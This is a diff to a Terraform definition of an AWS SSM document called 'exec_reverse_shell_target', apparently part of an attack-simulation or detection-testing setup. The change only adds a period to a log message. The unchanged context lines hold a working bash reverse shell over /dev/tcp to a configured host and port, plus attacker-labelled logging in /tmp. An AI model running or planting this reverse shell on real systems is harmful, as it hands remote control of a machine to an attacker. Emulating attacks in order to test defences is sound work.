@@ -33,7 +33,7 @@ resource "aws_ssm_document" "exec_reverse_shell_target" {
                         "echo \"Running: /bin/bash -c 'bash -i >& /dev/tcp/${local.host_ip}/${local.host_port} 0>&1' &\" >> /tmp/attacker_exec_reverseshell_target.log",
                         "/bin/bash -c 'bash -i >& /dev/tcp/${local.host_ip}/${local.host_port} 0>&1' &",
                         "echo -n $! > ${local.pid_path}",
-                        "echo \"Reverse Shell Connected..\" >> /tmp/attacker_exec_reverseshell_target.log",
+                        "echo \"Reverse Shell Connected...\" >> /tmp/attacker_exec_reverseshell_target.log",
                         "touch /tmp/attacker_exec_reverseshell_target",
                     ]
                 }
